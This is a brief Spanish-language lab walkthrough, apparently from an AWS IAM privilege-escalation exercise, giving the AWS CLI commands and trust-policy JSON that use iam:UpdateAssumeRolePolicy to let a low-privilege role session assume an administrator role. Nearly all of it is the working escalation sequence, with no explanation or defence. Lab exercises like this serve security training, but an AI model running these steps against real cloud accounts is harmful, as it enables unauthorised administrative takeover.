# Actualización de una AssumeRolePolicy
## iam:UpdateAssumeRolePolicy  
```bash
aws iam list-attached-user-policies --user-name privesc14-UpdatingAssumeRolePolicy-user  

aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc14-UpdatingAssumeRolePolicy --version-id v1  

aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc14-UpdatingAssumeRolePolicy-role --role-session-name privesc14  

aws sts get-caller-identity --profile privesc14  
```

Crear un archivo assume-role-policy.json  

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:sts::651927172911:assumed-role/privesc14-UpdatingAssumeRolePolicy-role/privesc14"
      },
      "Action": "sts:AssumeRole",
      "Condition": {}
    }
  ]
}
```

```bash
aws iam update-assume-role-policy --role-name Rol-Administrador --policy-document file://assume-role-policy.json --profile privesc14  

aws sts assume-role --role-arn arn:aws:iam::651927172911:role/Rol-Administrador --role-session-name privesc14admin --profile privesc14  
```

